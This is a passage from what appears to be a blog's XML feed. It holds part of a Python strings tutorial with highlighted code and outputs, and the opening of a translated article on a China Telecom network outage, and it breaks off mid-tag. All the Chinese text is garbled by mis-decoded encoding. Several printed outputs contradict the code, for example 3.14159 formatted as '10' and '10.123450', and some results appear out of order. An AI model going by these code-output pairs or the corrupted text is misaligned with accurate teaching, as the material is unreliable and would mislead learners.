å¦‚æœéœ€è¦å­—ç¬¦ä¸²åœ¨ä¸‹ä¸€è¡Œç»§ç»­ï¼Œä½¿ç”¨åæ–œæ </span></span><br><span class="line">my_string = <span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">I<span class="string">&#x27; m a &#x27;</span>Geek<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Hello</span></span><br><span class="line"><span class="string">World</span></span><br><span class="line"><span class="string">Hello World</span></span><br></pre></td></tr></table></figure><h3><span id="fang-wen-zi-fu-he-zi-zi-fu-chuan">è®¿é—®å­—ç¬¦å’Œå­å­—ç¬¦ä¸²</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç´¢å¼•è·å–å­—ç¬¦</span></span><br><span class="line">b = my_string[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡åˆ‡ç‰‡è·å–å­å­—ç¬¦ä¸²</span></span><br><span class="line">b = my_string[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># æ³¨æ„ï¼Œæœ€åä¸€ä¸ªç´¢å¼•ä¸åŒ…æ‹¬</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[:<span class="number">5</span>] <span class="comment"># ä»ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[<span class="number">6</span>:] <span class="comment"># ç›´åˆ°æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[::<span class="number">2</span>] <span class="comment"># ä»å¤´åˆ°ä¸ºæ¯éš”ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[::-<span class="number">1</span>] <span class="comment"># ä½¿ç”¨è´Ÿæ­¥é•¿ç¿»è½¬åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">H</span><br><span class="line">el</span><br><span class="line">Hello</span><br><span class="line">World</span><br><span class="line">HloWrd</span><br><span class="line">dlroW olleH</span><br></pre></td></tr></table></figure><h3><span id="lian-jie-liang-ge-huo-duo-ge-zi-fu-chuan">è¿æ¥ä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ + æ‹¼æ¥å­—ç¬¦ä¸²</span></span><br><span class="line">greeting = <span class="string">&quot;Hello&quot;</span></span><br><span class="line">name = <span class="string">&quot;Tom&quot;</span></span><br><span class="line">sentence = greeting + <span class="string">&#x27; &#x27;</span> + name</span><br><span class="line"><span class="built_in">print</span>(sentence)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello Tom</span><br></pre></td></tr></table></figure><h3><span id="die-dai"><strong>è¿­ä»£</strong></span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨forå¾ªç¯è¿­ä»£åˆ—è¡¨</span></span><br><span class="line">my_string = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_string:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">H</span><br><span class="line">e</span><br><span class="line">l</span><br><span class="line">l</span><br><span class="line">o</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-zi-fu-huo-zi-zi-fu-chuan-shi-fou-cun-zai">æ£€æŸ¥å­—ç¬¦æˆ–å­å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;e&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Hello&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;llo&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Hello&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="you-yong-de-fang-fa">æœ‰ç”¨çš„æ–¹æ³•</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&quot;     Hello World &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å»é™¤ç©ºæ ¼</span></span><br><span class="line">my_string = my_string.strip()</span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—ç¬¦çš„ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_string))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤§å°å†™</span></span><br><span class="line"><span class="built_in">print</span>(my_string.upper())</span><br><span class="line"><span class="built_in">print</span>(my_string.lower())</span><br><span class="line"></span><br><span class="line"><span class="comment"># startswith å’Œ endswith</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>.startswith(<span class="string">&quot;he&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>.endswith(<span class="string">&quot;llo&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾åˆ°å­å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªç´¢å¼•ï¼Œæ²¡æœ‰åˆ™è¿”å› -1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>.find(<span class="string">&quot;o&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—å­—ç¬¦æˆ–è€…å­å­—ç¬¦ä¸²çš„ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>.count(<span class="string">&quot;e&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨å…¶ä»–å­—ç¬¦ä¸²ä»£æ›¿å­å­—ç¬¦ä¸²ï¼ˆå½“ä¸”ä»…å½“å­å­—ç¬¦ä¸²å­˜åœ¨æ—¶ï¼‰</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šåŸå­—ç¬¦ä¸²ä¿æŒä¸å˜</span></span><br><span class="line">message = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">new_message = message.replace(<span class="string">&quot;World&quot;</span>, <span class="string">&quot;Universe&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å­—ç¬¦ä¸²åˆ‡åˆ†ä¸ºä¸ºåˆ—è¡¨</span></span><br><span class="line">my_string = <span class="string">&quot;how are you doing&quot;</span></span><br><span class="line">a = my_string.split() <span class="comment"># default argument is &quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">my_string = <span class="string">&quot;one,two,three&quot;</span></span><br><span class="line">a = my_string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†åˆ—è¡¨æ‹¼æ¥ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">my_list = [<span class="string">&#x27;How&#x27;</span>, <span class="string">&#x27;are&#x27;</span>, <span class="string">&#x27;you&#x27;</span>, <span class="string">&#x27;doing&#x27;</span>]</span><br><span class="line">a = <span class="string">&#x27; &#x27;</span>.join(my_list) <span class="comment"># ç»™å‡ºçš„å­—ç¬¦ä¸²æ˜¯åˆ†éš”ç¬¦ï¼Œæ¯”å¦‚åœ¨æ¯ä¸ªå…ƒç´ ä¹‹é—´æ·»åŠ  &#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello World</span><br><span class="line"><span class="number">11</span></span><br><span class="line">HELLO WORLD</span><br><span class="line">hello world</span><br><span class="line">[<span class="string">&#x27;how&#x27;</span>, <span class="string">&#x27;are&#x27;</span>, <span class="string">&#x27;you&#x27;</span>, <span class="string">&#x27;doing&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>]</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">Hello Universe</span><br><span class="line">How are you doing</span><br></pre></td></tr></table></figure><h3><span id="ge-shi-hua">æ ¼å¼åŒ–</span></h3><p>æ–°æ ·å¼ä½¿ç”¨ <code>format()</code> æ–¹æ³•ï¼Œæ—§æ ·å¼ä½¿ç”¨ <code>%</code> æ“ä½œç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨å¤§æ‹¬å·åšå ä½ç¬¦</span></span><br><span class="line">a = <span class="string">&quot;Hello &#123;0&#125; and &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤é¡ºåºæ—¶ä½ç½®å¯ä»¥ä¸å†™</span></span><br><span class="line">a = <span class="string">&quot;Hello &#123;&#125; and &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;The integer value is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€äº›æ•°å­—çš„ç‰¹æ®Šæ ¼å¼åŒ–è§„åˆ™</span></span><br><span class="line">a = <span class="string">&quot;The float value is &#123;0:.3f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2.1234</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&quot;The float value is &#123;0:e&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2.1234</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&quot;The binary value is &#123;0:b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># old style formatting by using % operator</span></span><br><span class="line"><span class="comment"># æ—§çš„æ–¹å¼ä½¿ç”¨ % æ“ä½œç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello %s and %s&quot;</span> % (<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Tom&quot;</span>)) <span class="comment"># å¤šä¸ªå‚æ•°æ—¶å¿…éœ€æ˜¯å…ƒç»„</span></span><br><span class="line">val =  <span class="number">3.14159265359</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The decimal value is %d&quot;</span> % val)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The float value is %f&quot;</span> % val)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The float value is %.2f&quot;</span> % val)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello Bob <span class="keyword">and</span> Tom</span><br><span class="line">Hello Bob <span class="keyword">and</span> Tom</span><br><span class="line">The integer value <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">2.123</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">2.123400e+00</span></span><br><span class="line">The binary value <span class="keyword">is</span> <span class="number">10</span></span><br><span class="line">Hello Bob <span class="keyword">and</span> Tom</span><br><span class="line">The decimal value <span class="keyword">is</span> <span class="number">10</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">10.123450</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">10.12</span></span><br></pre></td></tr></table></figure><h3><span id="f-strings">f-Strings</span></h3><p>ä» Python 3.6 èµ·ï¼Œå¯ä»¥ç›´æ¥åœ¨èŠ±æ‹¬å·å†…ä½¿ç”¨å˜é‡ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line">age = <span class="number">25</span></span><br><span class="line">a = <span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>. You are <span class="subst">&#123;age&#125;</span>.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">pi = <span class="number">3.14159</span></span><br><span class="line">a = <span class="string">f&quot;Pi is <span class="subst">&#123;pi:<span class="number">.3</span>f&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># f-Strings åœ¨è¿è¡Œæ—¶è®¡ç®—ï¼Œå¯ä»¥å…è®¸è¡¨è¾¾å¼</span></span><br><span class="line">a = <span class="string">f&quot;The value is <span class="subst">&#123;<span class="number">2</span>*<span class="number">60</span>&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello, Eric. You are <span class="number">25.</span></span><br><span class="line">Pi <span class="keyword">is</span> <span class="number">3.142</span></span><br><span class="line">The value <span class="keyword">is</span> <span class="number">120</span></span><br></pre></td></tr></table></figure><h3><span id="geng-duo-guan-yu-bu-bian-xing-he-pin-jie">æ›´å¤šå…³äºä¸å˜æ€§å’Œæ‹¼æ¥</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å› ä¸ºå­—ç¬¦ä¸²ä¸å¯å˜ï¼Œæ‰€ä»¥ä½¿ç”¨ + æˆ–è€… += æ‹¼æ¥å­—ç¬¦ä¸²æ€»æ˜¯ç”Ÿæˆæ–°çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"># å› æ­¤ï¼Œå¤šä¸ªæ“ä½œæ—¶æ›´åŠ è€—æ—¶ã€‚ä½¿ç”¨ join æ–¹æ³•æ›´å¿«ã€‚</span></span><br><span class="line"><span class="keyword">from</span> timeit <span class="keyword">import</span> default_timer <span class="keyword">as</span> timer</span><br><span class="line">my_list = [<span class="string">&quot;a&quot;</span>] * <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bad</span></span><br><span class="line">start = timer()</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_list:</span><br><span class="line">    a += i</span><br><span class="line">end = timer()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;concatenate string with + : %.5f&quot;</span> % (end - start))</span><br><span class="line"></span><br><span class="line"><span class="comment"># good</span></span><br><span class="line">start = timer()</span><br><span class="line">a = <span class="string">&quot;&quot;</span>.join(my_list)</span><br><span class="line">end = timer()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;concatenate string with join(): %.5f&quot;</span> % (end - start))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">concat string <span class="keyword">with</span> + : <span class="number">0.34527</span></span><br><span class="line">concat string <span class="keyword">with</span> join(): <span class="number">0.01191</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a[start:stop:step], é»˜è®¤æ­¥é•¿ä¸º 1</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">b = a[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># æ³¨æ„ï¼Œæœ€åä¸€ä¸ªç´¢å¼•ä¸åŒ…æ‹¬</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[<span class="number">2</span>:] <span class="comment"># ç›´åˆ°æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[:<span class="number">3</span>] <span class="comment"># ä»ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">0</span>] <span class="comment"># æ›¿æ¢å­éƒ¨åˆ†ï¼Œéœ€è¦å¯è¿­ä»£</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[::<span class="number">2</span>] <span class="comment"># ä»å¤´åˆ°ä¸ºæ¯éš”ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a = a[::-<span class="number">1</span>] <span class="comment"># ä½¿ç”¨è´Ÿæ­¥é•¿ç¿»è½¬åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[:] <span class="comment"># ä½¿ç”¨åˆ‡ç‰‡å¤åˆ¶å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      05. å­—ç¬¦ä¸² â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘ç»œæ•…éšœé€éœ²ä¸­å›½äº’è”ç½‘æ¥å…¥ç°çŠ¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-71/"/>
    <id>https://qiwihui.com/qiwihui-blog-71/</id>
    <published>2022-08-13T01:54:25.630Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>åŸæ–‡ï¼š<a href="https://blog.thousandeyes.com/internet-outage-reveals-reach-of-chinas-connectivity/">Internet Outage Reveals Reach of Chinaâ€™s Connectivity</a></p><p>å¤ªå¹³æ´‹æ ‡å‡†æ—¶é—´5æœˆ13æ—¥ä¸­åˆ12ç‚¹30åˆ†ï¼ˆåŒ—äº¬æ—¶é—´5æœˆ14æ—¥å‡Œæ™¨3:30ï¼‰ï¼Œä¸­å›½ç”µä¿¡ç»å†äº†æŒç»­è¿‘5ä¸ªå°æ—¶çš„é‡å¤§æ•…éšœï¼Œåç»­æ•ˆåº”æŒç»­äº†å‡ ä¸ªå°æ—¶ã€‚æ­£å¦‚åœ¨ç¾å›½å¯¹è´¸æ˜“æ”¿ç­–çš„ç´§å¼ å±€åŠ¿åŠ å‰§ä¹‹æ—¶æ‰€åšçš„é‚£æ ·ï¼Œå¯èƒ½å¾ˆå®¹æ˜“è®©äººè”æƒ³åˆ°å¯¹æ½œåœ¨åœ°ç¼˜æ”¿æ²»åŠ¨æœºçš„çŒœæµ‹ã€‚ç„¶è€Œï¼Œè¿™ç§çŒœæµ‹å¿½ç•¥äº†è®¸å¤šäººéƒ½ä¸çŸ¥é“çš„å…³äºä¸­å›½å’Œäº’è”ç½‘çš„ä¸€äº›é‡è¦çš„åŸºæœ¬ç°å®ã€‚è¿™æ¬¡ä¸­æ–­æ˜¯æ·±å…¥äº†è§£ä¸­å›½äº’è”ç½‘è¿æ¥çŠ¶å†µçš„ç»ä½³æœºä¼šã€‚</p><span id="more"></span><iframe width="560" height="315" src="https://www.youtube.com/embed/cBylzjskZho" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2><span id="wo-men-suo-jian-de">æˆ‘ä»¬æ‰€è§çš„</span></h2><p>æ˜¨å¤©ï¼Œä»ä¸‹åˆæ—©äº›æ—¶å€™å¼€å§‹ï¼Œæˆ‘ä»¬çš„å…¨çƒä¼˜åŠ¿ç‚¹å¼€å§‹æ£€æµ‹åˆ°ä¸­å›½ç”µä¿¡éª¨å¹²ç½‘ä¸Šè¿›å‡ºä¸­å›½çš„äº’è”ç½‘æµé‡å‡ºç°å¤§é‡æ•°æ®åŒ…ä¸¢å¤±ã€‚æ•°æ®åŒ…ä¸¢å¤±æŒç»­æ•°å°æ—¶ï¼Œä¸»è¦å½±å“ä¸­å›½å¤§é™†çš„ç½‘ç»œåŸºç¡€è®¾æ–½ï¼Œä½†ä¹Ÿå½±å“ä¸­å›½ç”µä¿¡åœ¨æ–°åŠ å¡çš„ç½‘ç»œå’Œç¾å›½çš„å¤šä¸ªæ¥å…¥ç‚¹ï¼ŒåŒ…æ‹¬æ´›æ‰çŸ¶ã€‚</p><p>åœ¨é•¿æ—¶é—´ä¸­æ–­çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡å—å½±å“çš„åŸºç¡€è®¾æ–½çš„ä»»ä½•æµé‡éƒ½è¢«ä¸¢å¼ƒï¼Œè¿™æ„å‘³ç€ä¸­å›½å¢ƒå†…å¤–çš„ä¸€äº›äº’è”ç½‘ç”¨æˆ·å°†é‡åˆ°è¿æ¥åˆ°å„ç§ç½‘ç«™å’Œåº”ç”¨ç¨‹åºçš„æœåŠ¡ä¸­æ–­ã€‚ä¸­å›½å¢ƒå†…çš„ç”¨æˆ·è¯•å›¾è®¿é—®ä¸­å›½ä»¥å¤–çš„ç½‘ç«™ä¼šå—åˆ°å½±å“ï¼ŒåŒæ—¶ä¸­å›½ä»¥å¤–çš„ç”¨æˆ·å°è¯•è¿æ¥åˆ°ä¸­å›½å¢ƒå†…çš„ç½‘ç«™ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p>è¿™äº›ä¸ä»…ä»…å½±å“è¥¿æ–¹ç½‘ç«™å’ŒæœåŠ¡ï¼Œè®¸å¤šç¾å›½ä¸»è¦ç½‘ç«™ï¼Œå¦‚Appleï¼ŒAmazonï¼ŒMicrosoftï¼ŒSlackï¼ŒWorkdayï¼ŒSAPç­‰åœ¨ä¸­æ–­æœŸé—´éƒ½å—åˆ°äº†å½±å“ã€‚ä¸‹å›¾æ˜¾ç¤ºäº†ä¸­æ–­çš„é™„å¸¦æŸå®³çš„éƒ¨åˆ†èŒƒå›´ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/57969235-a5393580-79a7-11e9-873f-62a2c42aa573.png" alt="Figure-1-China-Telecom-outage"></p><p>å›¾1ï¼šå—ä¸­å›½ç”µä¿¡ä¸­æ–­å½±å“çš„åŸºäºäº‘çš„æœåŠ¡ã€‚</p><p>åœ¨æœ€é«˜å³°æ—¶ï¼Œæˆ‘ä»¬æ£€æµ‹åˆ°å› ä¸­å›½ç”µä¿¡å…¨çƒéª¨å¹²ç½‘ç»œçŠ¶å†µè€Œä¸­æ–­çš„100å¤šé¡¹æœåŠ¡ã€‚æˆ‘ä»¬è¿˜æ£€æµ‹åˆ°ä¸­æ–­å¯¹åœ°ç†å½±å“çš„å˜åŒ–ï¼Œå¦‚ä¸‹é¢çš„ä¸¤ä¸ªçƒ­å›¾æ‰€ç¤ºï¼Œåœ¨ä¸­æ–­æœŸé—´çš„ä¸åŒç‚¹æ•è·ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/57969242-af5b3400-79a7-11e9-95ee-10ea7a8158f8.png" alt="Figure-2-Geographic-scope-China-Telecom-outage"></p><p>å›¾2ï¼šä¸­å›½ç”µä¿¡ä¸­æ–­çš„åœ°ç†èŒƒå›´åœ¨ä¸­æ–­æœŸé—´æœ‰æ‰€ä¸åŒã€‚</p><p>æœ€ä¸¥é‡çš„ä¸­æ–­æœŸæ˜¯åœ¨å¤ªå¹³æ´‹æ ‡å‡†æ—¶é—´12:30å¼€å§‹åçš„å‰ä¸‰ä¸ªå°æ—¶å†…å‘ç”Ÿçš„ï¼Œä½†è®¸å¤šæœåŠ¡åœ¨æ•°å°æ—¶åç»§ç»­å—åˆ°å½±å“ã€‚ä¸€é¡¹ç‰¹å®šæœåŠ¡çš„ä¸­æ–­çš„æ‰©å±•æ€§è´¨å¯ä»¥åœ¨ä¸‹é¢çš„å›¾3ä¸­çœ‹åˆ°ã€‚Amazon Web Servicesçš„æ•°æ®åŒ…ä¸¢å¤±ä»å¤ªå¹³æ´‹æ ‡å‡†æ—¶é—´12:30å¼€å§‹é£™å‡ï¼ŒæŒç»­çº¦5ä¸ªå°æ—¶ã€‚ä¸‹é¢çš„è·¯å¾„å¯è§†åŒ–æ˜¾ç¤ºäº†åœ¨17:30-17:45ï¼ˆå¤ªå¹³æ´‹æ ‡å‡†æ—¶é—´ï¼‰ä¹‹é—´çš„ç½‘ç»œçŠ¶å†µï¼Œæ­¤æ—¶å‰å¾€AWSçš„æµé‡ç»§ç»­è¢«ä¸­å›½ç”µä¿¡è·¯ç”±å™¨ä¸¢å¼ƒã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/57969353-bb93c100-79a8-11e9-9636-e0afabbcb50f.png" alt="Figure-3-AWS-services-impacted"></p><p>å›¾3ï¼šä¸­å›½ç”µä¿¡ç”¨æˆ·åœ¨12:30-17:45ï¼ˆå¤ªå¹³æ´‹æ ‡å‡†æ—¶é—´ï¼‰ä¹‹é—´å—å½±å“çš„AWSæœåŠ¡ã€‚</p><p>å—ä¸­æ–­å½±å“çš„å¦ä¸€å®¶ç¾å›½æœåŠ¡æ˜¯Cloudflareçš„æ‰˜ç®¡DNSæœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒWeWorkçš„åŸŸåç”±Cloudflareæ‰˜ç®¡ï¼Œåœ¨ä¸‹é¢çš„è·¯å¾„å¯è§†åŒ–ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å°è¯•è®¿é—®Cloudflareçš„DNSæœåŠ¡å™¨çš„æµé‡ï¼ˆç”±æœ€å³è¾¹çš„ç»¿è‰²èŠ‚ç‚¹è¡¨ç¤ºï¼ŒIPåœ°å€ä¸º173.245.58.135ï¼Œè¿™æ˜¯åœ°ç†ä½ç½®ä½äºç¾å›½çš„è·¯ç”±å‰ç¼€173.245.58.0/24çš„ä¸€éƒ¨åˆ†ã€‚ï¼‰è¢«ä¸­å›½å¢ƒå†…çš„ä¸­å›½ç”µä¿¡è·¯ç”±å™¨ä¸¢å¼ƒã€‚ç»“æœæ˜¯æ¥è‡ªä¸­å›½å¢ƒå†…çš„è®¸å¤šç”¨æˆ·æ— æ³•è®¿é—®WeWorkç½‘ç«™ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/57969270-efbab200-79a7-11e9-9013-05196425426d.png" alt="Figure-4-Cloudflare-DNS-resolution"></p><p>å›¾4ï¼šCloudflareçš„æ‰˜ç®¡DNSæœåŠ¡å—åˆ°å½±å“ï¼Œé˜»æ­¢äº†WeWorkåŸŸçš„DNSè§£æã€‚</p><h2><span id="zhong-guo-shi-shen-du-hu-lian-de">ä¸­å›½æ˜¯æ·±åº¦äº’è”çš„</span></h2><p>ä¸­æ–­ç°å·²è§£å†³ï¼Œä½†åœ¨ThousandEyesï¼Œæˆ‘ä»¬ç›¸ä¿¡æ¯æ¬¡äº’è”ç½‘åœè¿éƒ½æ˜¯ä¸€æ¬¡å­¦ä¹ æœºä¼šï¼Œè¿™ä¹Ÿä¸ä¾‹å¤–ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªè¦ç‚¹å¯èƒ½ä¸€èˆ¬ä¸å¤ªæ¸…æ¥šã€‚</p><p>é¦–å…ˆï¼Œå¤§å¤šæ•°äººè®¤ä¸ºâ€œ<a 